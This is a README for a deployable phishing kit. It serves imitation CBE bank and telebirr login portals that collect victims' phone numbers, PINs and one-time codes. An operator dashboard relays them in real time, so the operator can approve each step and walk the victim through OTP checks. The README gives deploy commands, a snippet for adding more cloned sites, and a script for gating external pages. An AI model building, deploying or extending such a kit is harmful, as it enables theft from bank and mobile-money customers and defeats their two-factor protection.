# Dash — one Vercel project, path routing

Single Next.js deployment. One domain, manual paths like `tea.com/login`:

```
your-app.vercel.app/          landing with links
your-app.vercel.app/dash      operator dashboard (Pass / Not Pass)
your-app.vercel.app/cbe       CBE commercial bank portal (from commercial.zip)
your-app.vercel.app/telebirr  telebirr / Ethio Telecom portal (from telebirr zip)
your-app.vercel.app/api/*     session API (create / poll / list / decide)
your-app.vercel.app/sites/site-a|b  static demos (still work)
your-app.vercel.app/gate.js   snippet for external static sites
```

## How gating works

- Visitor clicks Login / Verify / Continue on `/cbe` or `/telebirr` → `requestDashApproval()` (`lib/dash-gate.ts:58`) POSTs `{siteId, page, meta:{phone,pin,otp}}` to same-origin `/api/create-session`.
- Button holds its loading state (`Authenticating...` / `Verifying Code...` spinner) while you decide.
- `/dash` (`app/dash/page.tsx:1`) polls `/api/list-sessions` every 2s, shows phone/PIN/OTP, **Pass** / **Not Pass**.
- Pass → visitor advances to the other page (OTP step / dashboard). Not Pass → button silently resets, stays on page, no error/note.

Gated handlers:
- `app/cbe/page.tsx` login + biometric, `components/cbe/OtpVerification.tsx` OTP
- `app/telebirr/page.tsx` Next, `components/telebirr/OTPVerificationModal.tsx` PIN + OTP

## Deploy (1 project)

```bash
npm i && npm run build
npx vercel --prod   # framework: Next.js, root: /
```

No env vars needed (same-origin API). Optional for multi-instance persistence:
- `UPSTASH_REDIS_REST_URL`, `UPSTASH_REDIS_REST_TOKEN` (`lib/dash-store.ts:1` switches to Redis automatically).

Local: `npm run dev` → `/`, `/dash`, `/cbe`, `/telebirr`.

## Add a new website as a new path

1. Add `app/<name>/page.tsx` (+ `components/<name>/` if needed). Copy `lib/dash-gate.ts` usage:
   ```ts
   const decision = await requestDashApproval({ siteId: '<name>', page: 'login', meta: { phone, pin } });
   if (decision === 'pass') { /* go to other page */ } else { /* silently reset */ }
   ```
2. Add `{"id":"<name>","name":"...","path":"/<name>"}` to `sites.config.json`.
3. Deploy — live at `your-app.vercel.app/<name>`. No extra Vercel project.

Static-site alternative: tag a button with `data-dash-site` + load `/gate.js` (see `public/gate.js:1`).
